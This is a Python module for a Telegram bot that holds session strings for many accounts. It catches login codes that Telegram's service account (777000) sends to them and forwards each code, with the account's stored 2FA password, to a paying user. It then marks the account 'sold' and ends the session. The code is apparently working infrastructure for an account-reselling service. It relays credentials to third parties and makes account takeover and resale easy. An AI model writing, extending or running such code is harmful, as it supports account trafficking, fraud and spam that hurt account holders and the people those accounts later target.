import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.handlers import MessageHandler

from config import API_ID, API_HASH, SUPPORT_HANDLES
import database as db
from utils import extract_otp, detect_country, estimate_account_year, mask_phone

log = logging.getLogger(__name__)

active_clients: dict[str, Client] = {}
active_requests: dict[str, dict] = {}
bot_app: Client | None = None

TELEGRAM_CHAT_ID = 777000


def set_bot(bot: Client):
    global bot_app
    bot_app = bot
    log.info("Bot reference set")


async def _on_new_message(client: Client, message):
    phone = None
    for ph, cl in active_clients.items():
        if cl is client:
            phone = ph
            break
    if not phone:
        log.warning("Message received but no matching phone in active_clients")
        return

    text = message.text or message.caption or ""
    sender_name = "Telegram"

    log.info("[%s] New message from 777000: %s", phone, text[:150])

    code = extract_otp(text, from_service=True)
    log.info("[%s] OTP extraction: %s", phone, code)

    req = active_requests.get(phone)
    if not req:
        log.info("[%s] No active request, ignoring", phone)
        return

    user_id = req["user_id"]
    log.info("[%s] Active request from user %d", phone, user_id)

    if code:
        session = await db.get_session(phone)

        await db.save_otp(phone, code, text, sender_name, user_id)
        log.info("[%s] OTP '%s' saved to DB", phone, code)

        if bot_app:
            credits_left = await db.get_credits(user_id)
            credit_line = f"\n💰 Credits left: {credits_left}"
            pwd = session.get("password", "") if session else ""
            pwd_line = f"\n🔐 2FA Password: `{pwd}`" if pwd else ""
            masked = mask_phone(phone)
            support = " | ".join(SUPPORT_HANDLES)
            try:
                await bot_app.send_message(
                    user_id,
                    f"🔑 **OTP Received!**\n\n"
                    f"📱 Number: `{masked}`\n"
                    f"🔢 Code: `{code}`\n"
                    f"👤 From: {sender_name}{pwd_line}{credit_line}\n\n"
                    f"⚠️ Issues logging in? Contact support:\n{support}",
                )
                log.info("[%s] OTP '%s' forwarded to user %d", phone, code, user_id)
            except Exception as e:
                log.error("[%s] Failed to forward OTP to %d: %s", phone, user_id, e)

        release_number(phone)
        await db.mark_session_sold(phone, user_id)
        asyncio.create_task(stop_session(phone))
        log.info("[%s] Marked as sold", phone)
    else:
        if bot_app:
            try:
                await bot_app.send_message(
                    user_id,
                    f"📩 **New message on** `{mask_phone(phone)}`\n\n"
                    f"👤 From: {sender_name}\n"
                    f"📝 {text[:500] if text else '(no text)'}",
                )
                log.info("[%s] Non-OTP message forwarded to user %d", phone, user_id)
            except Exception as e:
                log.error("[%s] Failed to forward msg to %d: %s", phone, user_id, e)


def assign_number(phone: str, user_id: int, timeout: int = 300):
    if phone in active_requests and active_requests[phone].get("timer"):
        active_requests[phone]["timer"].cancel()

    loop = asyncio.get_event_loop()
    timer = loop.call_later(timeout, lambda: release_number(phone))
    active_requests[phone] = {
        "user_id": user_id,
        "timer": timer,
    }
    log.info("[%s] Assigned to user %d (timeout=%ds)", phone, user_id, timeout)


def release_number(phone: str):
    req = active_requests.pop(phone, None)
    if req:
        if req.get("timer"):
            req["timer"].cancel()
        log.info("[%s] Released (was user %d)", phone, req["user_id"])
    else:
        log.info("[%s] Release called but no active request", phone)


def get_request_user(phone: str) -> int | None:
    req = active_requests.get(phone)
    return req["user_id"] if req else None


async def start_session(phone: str, session_string: str):
    """Start a userbot session and register the 777000 message handler."""
    if phone in active_clients:
        log.info("[%s] Session already running", phone)
        return

    log.info("[%s] Starting session...", phone)
    client = Client(
        name=f"session_{phone.replace('+', '')}",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
        in_memory=True,
    )
    client.add_handler(
        MessageHandler(_on_new_message, filters.chat(TELEGRAM_CHAT_ID) & filters.incoming)
    )
    await client.start()
    active_clients[phone] = client

    try:
        me = await client.get_me()
        year = estimate_account_year(me.id)
        await db.set_session_account_info(phone, me.id, year)
        log.info("[%s] Logged in as %s (ID: %d, ~%s)", phone, me.first_name, me.id, year)
    except Exception as e:
        log.warning("[%s] get_me failed: %s", phone, e)

    log.info("[%s] Session started, listening for messages from 777000", phone)


async def stop_session(phone: str):
    """Stop a userbot session."""
    client = active_clients.pop(phone, None)
    if client:
        try:
            await client.stop()
            log.info("[%s] Session stopped", phone)
        except Exception as e:
            log.warning("[%s] Error stopping session: %s", phone, e)


async def remove_client(phone: str):
    """Stop session, release number, and delete from DB."""
    log.info("[%s] Removing client...", phone)
    await stop_session(phone)
    release_number(phone)
    await db.remove_session(phone)
    log.info("[%s] Client fully removed", phone)


async def validate_sessions():
    """On startup, verify sessions exist and backfill missing country codes."""
    sessions = await db.get_active_sessions()
    log.info("Found %d session(s) in DB (will connect on assignment)", len(sessions))
    for s in sessions:
        phone = s["phone_number"]
        cc = s.get("country_code")
        if not cc or cc == "XX":
            detected, _, _ = detect_country(phone)
            if detected != "XX" or not cc:
                await db.db.sessions.update_one(
                    {"phone_number": phone},
                    {"$set": {"country_code": detected}},
                )
                cc = detected
                log.info("  %s — backfilled country=%s", phone, cc)
        log.info("  %s — status=%s country=%s", phone, s.get("status"), cc)


async def verify_session(phone: str, session_string: str) -> tuple[bool, str]:
    """Try to connect a session to check if it's valid. Returns (ok, error_msg)."""
    log.info("[%s] Verifying session...", phone)
    client = Client(
        name=f"verify_{phone.replace('+', '')}",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
        in_memory=True,
    )
    try:
        await client.start()
        me = await client.get_me()
        year = estimate_account_year(me.id)
        await db.set_session_account_info(phone, me.id, year)
        log.info("[%s] Verified OK — %s (ID: %d, ~%s)", phone, me.first_name, me.id, year)
        await client.stop()
        return True, ""
    except Exception as e:
        log.warning("[%s] Verification failed: %s", phone, e)
        try:
            await client.stop()
        except Exception:
            pass
        return False, str(e)


async def check_password(phone: str, password: str) -> tuple[bool, str]:
    """Check if a 2FA password is correct on an active session. Returns (ok, error_msg)."""
    client = active_clients.get(phone)
    if not client:
        return False, "Session not connected"
    try:
        await client.check_password(password)
        log.info("[%s] Password check passed", phone)
        return True, ""
    except Exception as e:
        log.warning("[%s] Password check failed: %s", phone, e)
        return False, str(e)


async def disconnect_all():
    for phone in list(active_clients):
        try:
            await active_clients[phone].stop()
        except Exception:
            pass
    active_clients.clear()
    active_requests.clear()
    log.info("All clients disconnected")
